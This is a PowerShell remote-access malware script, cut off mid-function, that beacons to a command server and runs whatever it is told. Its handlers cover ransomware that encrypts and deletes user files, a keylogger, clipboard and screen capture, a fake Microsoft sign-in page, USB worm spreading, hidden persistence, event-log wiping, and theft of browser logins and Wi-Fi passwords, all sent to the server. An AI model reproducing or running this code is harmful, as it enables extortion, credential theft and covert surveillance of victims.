# BomKaosKaki.ps1 - Full C2 Agent with Command Polling
# Two-way communication: sends heartbeats & exfil, polls for commands

# ============ CONFIGURATION ============
$C2Server = "https://bom-kaos-kaki.vercel.app"
$PollInterval = 15  # seconds between command polling
$HeartbeatInterval = 30  # seconds between heartbeats

# ============ RUNTIME STATE ============
$Script:SessionId = $null
$Script:KeyloggerRunning = $false
$Script:SpywareRunning = $false
$Script:RansomwareKey = $null
$Script:EncryptedFiles = @()
$Script:LastCommandPoll = 0
$Script:LastHeartbeat = 0

# ============ UTILITY FUNCTIONS ============

function Get-Timestamp {
    return (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
}

function Get-SessionId {
    param([int]$Length = 16)
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    $id = -join ((1..$Length) | ForEach-Object { $chars[(Get-Random % $chars.Length)] })
    return $id
}

function Invoke-WebRequestWithRetry {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [object]$Body = $null,
        [int]$MaxRetries = 3
    )
    
    for ($i = 0; $i -lt $MaxRetries; $i++) {
        try {
            $params = @{
                Uri             = $Uri
                Method          = $Method
                UseBasicParsing = $true
                TimeoutSec      = 30
            }
            if ($Body) {
                $params["Body"] = ($Body | ConvertTo-Json -Compress)
                $params["ContentType"] = "application/json"
            }
            $response = Invoke-WebRequest @params
            $content = $response.Content
            if ($content) {
                try { return $content | ConvertFrom-Json } catch { return $content }
            }
            return $null
        }
        catch {
            if ($i -eq $MaxRetries - 1) { Write-Host "[!] Request failed after $MaxRetries retries: $_" -ForegroundColor Red }
            Start-Sleep -Seconds 2
        }
    }
    return $null
}

function Send-ExfilData {
    param(
        [string]$Type,
        [object]$Data,
        [string]$Filename = $null,
        [byte[]]$FileBytes = $null
    )
    
    try {
        if ($FileBytes -and $Filename) {
            # Multipart upload for files
            $boundary = [System.Guid]::NewGuid().ToString()
            $body = @()
            
            # Session ID field
            $body += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
            $body += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`n$Type`r`n"
            $body += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$Filename`"`r`nContent-Type: application/octet-stream`r`n`r`n"
            $body += [System.Text.Encoding]::UTF8.GetString($FileBytes)
            $body += "`r`n--$boundary--`r`n"
            
            $fullBody = [System.Text.Encoding]::UTF8.GetBytes($body -join "")
            
            $response = Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST `
                -ContentType "multipart/form-data; boundary=$boundary" `
                -Body $fullBody -UseBasicParsing -TimeoutSec 30
            return $true
        }
        else {
            # JSON upload
            $payload = @{
                session_id = $Script:SessionId
                type       = $Type
                data       = $Data
                timestamp  = Get-Timestamp
            }
            $response = Invoke-WebRequestWithRetry -Uri "$C2Server/api/exfil" -Method POST -Body $payload
            return $response -and $response.success
        }
    }
    catch {
        Write-Host "[!] Exfil failed: $_" -ForegroundColor Red
        return $false
    }
}

# ============ HEARTBEAT ============

function Send-Heartbeat {
    param([switch]$Force)
    
    $now = Get-Date
    if ((-not $Force) -and (($now - $Script:LastHeartbeat).TotalSeconds -lt $HeartbeatInterval)) {
        return $null
    }
    
    $Script:LastHeartbeat = $now
    
    $modules = @()
    if ($Script:KeyloggerRunning) { $modules += "keylogger" }
    if ($Script:SpywareRunning) { $modules += "spyware" }
    if ($Script:RansomwareKey) { $modules += "ransomware" }
    
    $payload = @{
        session_id = $Script:SessionId
        hostname   = $env:COMPUTERNAME
        username   = "$($env:USERDOMAIN)\$($env:USERNAME)"
        os_info    = (Get-WmiObject Win32_OperatingSystem).Caption
        ip         = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
        is_admin   = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        process_id = $PID
        modules    = $modules
        timestamp  = Get-Timestamp
    }
    
    $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/heartbeat" -Method POST -Body $payload
    return $result
}

# ============ COMMAND POLLING ============

function Invoke-CommandPoll {
    try {
        $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/get_commands?session_id=$($Script:SessionId)" -Method GET
        
        if ($result -and $result.success -and $result.commands) {
            foreach ($cmd in $result.commands) {
                Write-Host "[>] Executing command: $($cmd.command_type) (ID: $($cmd.id))" -ForegroundColor Cyan
                
                $cmdResult = $null
                $cmdError = $null
                $cmdStatus = "completed"
                
                try {
                    switch ($cmd.command_type) {
                        "exec" { $cmdResult = Invoke-ExecuteCommand $cmd }
                        "ransomware" { $cmdResult = Invoke-Ransomware $cmd }
                        "keylogger" { $cmdResult = Invoke-Keylogger $cmd }
                        "stop_keylogger" { $cmdResult = Stop-Keylogger $cmd }
                        "clipboard" { $cmdResult = Invoke-ClipboardSteal $cmd }
                        "screenshot" { $cmdResult = Invoke-Screenshot $cmd }
                        "phishing" { $cmdResult = Invoke-Phishing $cmd }
                        "spread" { $cmdResult = Invoke-Spread $cmd }
                        "persistence" { $cmdResult = Invoke-Persistence $cmd }
                        "spyware" { $cmdResult = Invoke-Spyware $cmd }
                        "clean" { $cmdResult = Invoke-CleanTraces $cmd }
                        "steal_browser" { $cmdResult = Invoke-StealBrowser $cmd }
                        "steal_wifi" { $cmdResult = Invoke-StealWiFi $cmd }
                        "system_info" { $cmdResult = Invoke-SystemInfo $cmd }
                        "uninstall" { $cmdResult = Invoke-Uninstall $cmd }
                        default { $cmdError = "Unknown command type: $($cmd.command_type)" }
                    }
                }
                catch {
                    $cmdStatus = "error"
                    $cmdError = $_.Exception.Message
                    Write-Host "[!] Command failed: $cmdError" -ForegroundColor Red
                }
                
                # Report completion
                $report = @{
                    command_id   = $cmd.id
                    command_type = $cmd.command_type
                    session_id   = $Script:SessionId
                    status       = $cmdStatus
                    result       = $cmdResult
                    error        = $cmdError
                }
                
                Invoke-WebRequestWithRetry -Uri "$C2Server/api/command_complete" -Method POST -Body $report
                Write-Host "[+] Command $($cmd.id) completed with status: $cmdStatus" -ForegroundColor Green
            }
        }
    }
    catch {
        # Silently fail on poll errors
    }
}

# ============ COMMAND HANDLERS ============

function Invoke-ExecuteCommand {
    param($cmd)
    $script = $cmd.parameters.script
    if (-not $script) { return "No script provided" }
    
    try {
        $result = Invoke-Expression $script 2>&1 | Out-String
        return $result
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Invoke-SystemInfo {
    param($cmd)
    $info = @{}
    $info["ComputerName"] = $env:COMPUTERNAME
    $info["UserName"] = "$($env:USERDOMAIN)\$($env:USERNAME)"
    $info["OS"] = (Get-WmiObject Win32_OperatingSystem).Caption
    $info["OSVersion"] = (Get-WmiObject Win32_OperatingSystem).Version
    $info["Architecture"] = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    $info["CPU"] = (Get-WmiObject Win32_Processor).Name
    $info["RAM_GB"] = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $info["IP"] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
    $info["MAC"] = (Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object -First 1).MacAddress
    $info["IsAdmin"] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $info["Antivirus"] = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct 2>$null).displayName -join ", "
    $info["Processes"] = (Get-Process | Select-Object -First 30 Name, CPU, WorkingSet | ConvertTo-Json -Compress)
    
    Send-ExfilData -Type "system" -Data $info
    return ($info | ConvertTo-Json -Compress)
}

function Invoke-Ransomware {
    param($cmd)
    
    # Generate encryption key
    $key = [Convert]::ToBase64String([byte[]]::new(32))
    $Script:RansomwareKey = $key
    
    $targetDirs = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Videos"
    )
    
    $extensions = @(".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".zip", ".rar", ".7z", ".sql", ".db", ".mdb", ".accdb", ".mp3", ".mp4", ".avi", ".mkv", ".php", ".html", ".css", ".js")
    
    $encrypted = 0
    $ransomNote = @"
===============================================
        YOUR FILES HAVE BEEN ENCRYPTED
===============================================

All your important documents, pictures, and files
have been encrypted with AES-256 encryption.

To recover your files, you must pay 0.1 BTC to
the following address:

  bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

After payment, contact us with your session ID:
  $($Script:SessionId)

DO NOT attempt to decrypt files yourself.
DO NOT use third-party recovery tools.
You will lose your data permanently.

Session ID: $($Script:SessionId)
===============================================
"@
    
    foreach ($dir in $targetDirs) {
        if (Test-Path $dir) {
            $files = Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | 
            Where-Object { $_.Extension -in $extensions }
            
            foreach ($file in $files) {
                try {
                    $content = [System.IO.File]::ReadAllBytes($file.FullName)
                    
                    # Simple XOR "encryption" for demo (replace with proper AES in production)
                    $encryptedContent = $content | ForEach-Object { $_ -bxor 0xAB }
                    
                    $encryptedPath = "$($file.FullName).kaoskaki"
                    [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedContent)
                    Remove-Item $file.FullName -Force
                    
                    $Script:EncryptedFiles += @{
                        original  = $file.FullName
                        encrypted = $encryptedPath
                    }
                    $encrypted++
                }
                catch {
                    Write-Host "[!] Failed to encrypt: $($file.FullName)" -ForegroundColor Red
                }
            }
        }
    }
    
    # Drop ransom note on desktop
    $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
    [System.IO.File]::WriteAllText($notePath, $ransomNote)
    
    # Report
    $result = @{
        encrypted_count = $encrypted
        directories     = $targetDirs
        key             = "[REDACTED]"
        ransom_note     = $notePath
        session_id      = $Script:SessionId
    }
    
    Send-ExfilData -Type "ransomware" -Data $result
    return "Encrypted $encrypted files. Ransom note dropped."
}

function Invoke-Keylogger {
    param($cmd)
    
    if ($Script:KeyloggerRunning) {
        return "Keylogger already running"
    }
    
    $Script:KeyloggerRunning = $true
    $logPath = "$env:TEMP\kb_$($Script:SessionId).log"
    
    # Start keylogger in background job
    $Script:KeyloggerJob = Start-Job -ScriptBlock {
        param($sessionId, $c2Server, $logPath)
        
        $logFile = $logPath
        # $keys = ""
        $lastSend = Get-Date
        
        $source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.IO;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    
    public static string GetActiveWindowTitle() {
        const int nChars = 256;
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();
        if (GetWindowText(handle, Buff, nChars) > 0) {
            return Buff.ToString();
        }
        return "";
    }
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@
        
        try {
            Add-Type -TypeDefinition $source -Language CSharp
        }
        catch {}
        
        $lastWindow = ""
        $buffer = ""
        
        while ($true) {
            Start-Sleep -Milliseconds 50
            
            for ($i = 8; $i -le 190; $i++) {
                $state = [KeyLogger]::GetAsyncKeyState($i)
                if ($state -eq -32767 -or $state -eq 1) {
                    $key = [char]$i
                    if ($i -ge 16 -and $i -le 17) { continue }  # Skip shift/ctrl
                    
                    $windowTitle = [KeyLogger]::GetActiveWindowTitle()
                    if ($windowTitle -ne $lastWindow) {
                        $buffer += "[ Window: $windowTitle ]`n"
                        $lastWindow = $windowTitle
                    }
                    
                    # Map special keys
                    switch ($i) {
                        8 { $key = "[BACKSPACE]" }
                        9 { $key = "[TAB]" }
                        13 { $key = "[ENTER]`n" }
                        20 { $key = "[CAPSLOCK]" }
                        27 { $key = "[ESC]" }
                        32 { $key = " " }
                        46 { $key = "[DELETE]" }
                    }
                    
                    $buffer += $key
                    
                    # Write to log file
                    try {
                        [System.IO.File]::AppendAllText($logFile, $key)
                    }
                    catch {}
                }
            }
            
            # Send every 30 seconds
            if ((Get-Date) - $lastSend -gt [TimeSpan]::FromSeconds(30) -and $buffer.Length -gt 0) {
                try {
                    $payload = @{
                        session_id = $sessionId
                        type       = "keylog"
                        data       = $buffer
                        timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                    }
                    $json = $payload | ConvertTo-Json -Compress
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", $json) | Out-Null
                    $buffer = ""
                    $lastSend = Get-Date
                }
                catch {}
            }
        }
    } -ArgumentList $Script:SessionId, $C2Server, $logPath
    
    return "Keylogger started. Log: $logPath"
}

function Stop-Keylogger {
    param($cmd)
    
    if (-not $Script:KeyloggerRunning) {
        return "Keylogger not running"
    }
    
    try {
        if ($Script:KeyloggerJob) {
            $Script:KeyloggerJob | Stop-Job -Force
            $Script:KeyloggerJob | Remove-Job -Force
        }
    }
    catch {}
    
    $Script:KeyloggerRunning = $false
    return "Keylogger stopped"
}

function Invoke-ClipboardSteal {
    param($cmd)
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
        
        $result = @{
            content = $clipboardText
            length  = $clipboardText.Length
        }
        
        Send-ExfilData -Type "clipboard" -Data $result
        return "Clipboard stolen ($($clipboardText.Length) chars)"
    }
    catch {
        return "Failed to steal clipboard: $($_.Exception.Message)"
    }
}

function Invoke-Screenshot {
    param($cmd)
    
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $filename = "screenshot_$($Script:SessionId)_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        # Send as multipart
        $filename = "screenshot_$($Script:SessionId)_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @()
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`nscreenshot`r`n"
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`nContent-Type: image/png`r`n`r`n"
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "")
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
        
        $fullBody = New-Object byte[] ($bodyBytes.Length + $bytes.Length + $footerBytes.Length)
        [Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
        [Buffer]::BlockCopy($bytes, 0, $fullBody, $bodyBytes.Length, $bytes.Length)
        [Buffer]::BlockCopy($footerBytes, 0, $fullBody, $bodyBytes.Length + $bytes.Length, $footerBytes.Length)
        
        Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $fullBody -UseBasicParsing -TimeoutSec 30 | Out-Null
        
        return "Screenshot captured and exfiltrated ($($bytes.Length) bytes)"
    }
    catch {
        return "Screenshot failed: $($_.Exception.Message)"
    }
}

function Invoke-Phishing {
    param($cmd)
    
    $phishingDir = "$env:TEMP\kaoskaki_phishing"
    New-Item -ItemType Directory -Force -Path $phishingDir | Out-Null
    
    # Create a fake login page
    $html = @"
        <!DOCTYPE html>
        <html>
        <head><title>Microsoft - Sign In</title><style>
        body { font-family:Segoe UI, sans-serif; background:#f0f0f0; display:flex; justify-content:center; align-items:center; height:100vh; margin:0 }
        .card { background:white; padding:40px; border-radius:8px; box-shadow:0 2px 20px rgba(0, 0, 0, .1); width:360px; text-align:center }
        .logo { font-size:28px; font-weight:600; color:#00a4ef; margin-bottom:30px }
        input { width:100%; padding:12px; margin:8px 0; border:1px solid #ddd;border-radius:4px;font-size:14px;box-sizing:border-box}
        button { width:100%; padding:12px; background:#00a4ef; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer; margin-top:12px }
        button:hover { background:#0088cc }
        </style></head>
        <body>
        <div class="card">
        <div class="logo">Microsoft</div>
        <form method="POST" action="/api/phish_capture">
        <input type="email" name="email" placeholder="Email, phone, or Skype" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button>
        </form>
        </div>
        </body>
        </html>
"@
    
    $htmlPath = "$phishingDir\index.html"
    [System.IO.File]::WriteAllText($htmlPath, $html)
    
    # Start a simple HTTP server
    $port = 8080
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Start()
    
    $null = Start-Job -ScriptBlock {
        param($dir, $port, $sessionId, $c2Server)
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://localhost:$port/")
        $listener.Start()
        
        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            
            if ($request.HttpMethod -eq "POST" -and $request.Url.AbsolutePath -eq "/api/phish_capture") {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                
                # Exfil captured credentials
                $payload = @{
                    session_id = $sessionId
                    type       = "phishing_creds"
                    data       = $body
                    timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                }
                try {
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
                }
                catch {}
                
                # Redirect to real Microsoft
                $response.Redirect("https://login.live.com")
            }
            else {
                # Serve the phishing page
                $html = [System.IO.File]::ReadAllText("$dir\index.html")
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentType = "text/html"
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            $response.Close()
        }
    } -ArgumentList $phishingDir, $port, $Script:SessionId, $C2Server
    
    $result = @{
        local_url = "http://localhost:$port"
        directory = $phishingDir
        port      = $port
    }
    
    Send-ExfilData -Type "phishing" -Data $result
    return "Phishing page running on http://localhost:$port. Use ngrok to expose externally."
}

function Invoke-Spread {
    param($cmd)
    
    $spreadPath = "$env:TEMP\spread_$($Script:SessionId).ps1"
    $scriptContent = @'
# Spread via USB autorun
$driveLetters = [char[]]('D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
$c2Url = "C2_URL_PLACEHOLDER"
$payloadUrl = "$c2Url/api/payload"
$targetName = "KAOSKAKI.exe"

while ($true) {
    foreach ($drive in $driveLetters) {
        $path = "$drive`:\"
        if (Test-Path $path) {
            $driveType = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$drive'").DriveType
            if ($driveType -eq 2) { # Removable
                $shortcutPath = "$path\KAOSKAKI.lnk"
                if (-not (Test-Path $shortcutPath)) {
                    try {
                        # Download payload
                        Invoke-WebRequest -Uri $payloadUrl -OutFile "$path\$targetName" -UseBasicParsing
                        
                        # Create autorun shortcut
                        $WScriptShell = New-Object -ComObject WScript.Shell
                        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
                        $shortcut.TargetPath = "$path\$targetName"
                        $shortcut.WorkingDirectory = $path
                        $shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll, 3"
                        $shortcut.Description = "Documents"
                        $shortcut.Save()
                        
                        # Create autorun.inf
                        $autorun = "[Autorun]`nopen=$targetName`naction=Open folder to view files`nshell\open\command=$targetName`nshell\explore\command=$targetName"
                        [System.IO.File]::WriteAllText("$path\autorun.inf", $autorun)
                        
                        # Set hidden + system attributes
                        attrib +h +s "$path\$targetName" "$path\autorun.inf" "$shortcutPath"
                    } catch {}
                }
            }
        }
    }
    Start-Sleep -Seconds 30
}
'@
    
    $scriptContent = $scriptContent.Replace("C2_URL_PLACEHOLDER", $C2Server)
    [System.IO.File]::WriteAllText($spreadPath, $scriptContent)
    
    # Execute spread monitor
    Start-Job -FilePath $spreadPath
    
    return "USB spread monitor started. Checking for removable drives every 30 seconds."
}

function Invoke-Persistence {
    param($cmd)
    
    $currentPath = (Get-Process -Id $PID).Path
    $payloadPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1"
    $vbsPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs"
    $batPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.bat"
    
    # Copy current script
    if (Test-Path $currentPath) {
        Copy-Item $currentPath $payloadPath -Force
    }
    
    # Create VBS launcher (hidden)
    $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"", 0, False
"@
    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
    
    # Create batch launcher
    $batContent = "``@echo off`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"`nexit"
    [System.IO.File]::WriteAllText($batPath, $batContent)
    
    $methods = @()
    
    # Method 1: Registry Run
    try {
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force | Out-Null
        $methods += "registry_run"
    }
    catch {}
    
    # Method 2: Startup Folder
    try {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs"
        Copy-Item $vbsPath $startupPath -Force
        $methods += "startup_folder"
    }
    catch {}
    
    # Method 3: Scheduled Task (if admin)
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
        $methods += "scheduled_task"
    }
    catch {}
    
    $result = @{
        methods      = $methods
        payload_path = $payloadPath
        vbs_path     = $vbsPath
        bat_path     = $batPath
    }
    
    Send-ExfilData -Type "persistence" -Data $result
    return "Persistence installed: $($methods -join ', ')"
}

function Invoke-Spyware {
    param($cmd)
    
    if ($Script:SpywareRunning) {
        return "Spyware already running"
    }
    
    $Script:SpywareRunning = $true
    
    # Start spyware monitoring job
    $Script:SpywareJob = Start-Job -ScriptBlock {
        param($sessionId, $c2Server)
        
        # Monitor network connections
        while ($true) {
            try {
                $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | 
                Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
                Where-Object { $_.RemoteAddress -notin @("127.0.0.1", "::1") } |
                Select-Object -First 20
                
                if ($connections) {
                    $payload = @{
                        session_id = $sessionId
                        type       = "spyware_connections"
                        data       = ($connections | ConvertTo-Json -Compress)
                        timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                    }
                    try {
                        $webClient = New-Object System.Net.WebClient
                        $webClient.Headers.Add("Content-Type", "application/json")
                        $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
                    }
                    catch {}
                }
                
                # Monitor running processes
                $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, CPU, WorkingSet, StartTime
                $payload2 = @{
                    session_id = $sessionId
                    type       = "spyware_processes"
                    data       = ($procs | ConvertTo-Json -Compress)
                    timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                }
                try {
                    $webClient2 = New-Object System.Net.WebClient
                    $webClient2.Headers.Add("Content-Type", "application/json")
                    $webClient2.UploadString("$c2Server/api/exfil", ($payload2 | ConvertTo-Json -Compress)) | Out-Null
                }
                catch {}
            }
            catch {}
            
            Start-Sleep -Seconds 120
        }
    } -ArgumentList $Script:SessionId, $C2Server
    
    return "Spyware monitoring started (network connections + top processes every 2 min)"
}

function Invoke-CleanTraces {
    param($cmd)
    
    $cleaned = @()
    
    # Clear PowerShell history
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
        $cleaned += "powershell_history"
    }
    catch {}
    
    # Clear event logs (if admin)
    try {
        wevtutil cl "Windows PowerShell" 2>$null
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Security" 2>$null
        wevtutil cl "System" 2>$null
        wevtutil cl "Application" 2>$null
        $cleaned += "event_logs"
    }
    catch {}
    
    # Clear temp files
    try {
        Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        $cleaned += "temp_files"
    }
    catch {}
    
    # Clear recent files
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        $cleaned += "recent_files"
    }
    catch {}
    
    # Clear prefetch (if admin)
    try {
        Remove-Item "$env:WINDIR\Prefetch\*" -Force -ErrorAction SilentlyContinue
        $cleaned += "prefetch"
    }
    catch {}
    
    # Clear clipboard
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::Clear()
        $cleaned += "clipboard"
    }
    catch {}
    
    # Clear Run MRU
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        $cleaned += "run_mru"
    }
    catch {}
    
    $result = @{ cleaned = $cleaned }
    Send-ExfilData -Type "clean" -Data $result
    return "Cleaned: $($cleaned -join ', ')"
}

function Invoke-StealBrowser {
    param($cmd)
    
    $browsers = @(
        @{path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; name = "Chrome" },
        @{path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; name = "Edge" },
        @{path = "$env:APPDATA\Opera Software\Opera Stable\Login Data"; name = "Opera" },
        @{path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; name = "Brave" }
    )
    
    $results = @()
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.path) {
            try {
                # Copy file (SQLite is locked while browser runs)
                $tempFile = "$env:TEMP\login_data_$($browser.name)_$([Guid]::NewGuid().Guid).db"
                Copy-Item $browser.path $tempFile -Force
                
                # Try to read using ADO.NET
                try {
                    # $connString = "Provider=Microsoft.ACE.OLEDB.12.0; Data Source=$tempFile; Extended Properties='Excel 12.0;HDR=YES'; "
                    # Alternative: use SQLite if available
                    Add-Type -Path "$env:TEMP\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
                }
                catch {}
                
                $results += @{
                    browser = $browser.name
                    path    = $browser.path
                    size    = (Get-Item $browser.path).Length
                    stolen  = $true
                }
                
                # Upload the database file
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                Send-ExfilData -Type "browser" -Data @{
                    browser = $browser.name
                    file    = [Convert]::ToBase64String($bytes)
                    size    = $bytes.Length
                }
                
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            }
            catch {
                $results += @{
                    browser = $browser.name
                    path    = $browser.path
                    error   = $_.Exception.Message
                    stolen  = $false
                }
            }
        }
        else {
            $results += @{ browser = $browser.name; stolen = $false; reason = "Not installed" }
        }
    }
    
    return ($results | ConvertTo-Json -Compress)
}

function Invoke-StealWiFi {
    param($cmd)
    
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $_.ToString().Split(':')[1].Trim()
    }
    
    $wifiData = @()
    
    foreach ($wifiProfile in $profiles) {
        try {
            $details = netsh wlan show profile name="$wifiProfile" key=clear
            $password = ($details | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
            $auth = ($details | Select-String "Authentication" | Select-Object -First 1 | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
            
            $wifiData += @{
                ssid     = $wifiProfile
                password = if ($password) { $password } else { "(open network)" }
                auth     = if ($auth) { $auth } else { "Unknown" }
            }
        }
        catch {
            $wifiData += @{ ssid = $wifiProfile; password = "(error reading)"; error = $_.Exception.Message }
        }
    }
    
    $result = @{ networks = $wifiData; count = $wifiData.Count }
    Send-ExfilData -Type "wifi" -Data $result
    return ($result | ConvertTo-Json -Compress)
}

function Invoke-Uninstall {
    param($cmd)
    
    $null = Invoke-CleanTraces $cmd
    
    # Remove persistence
    try {
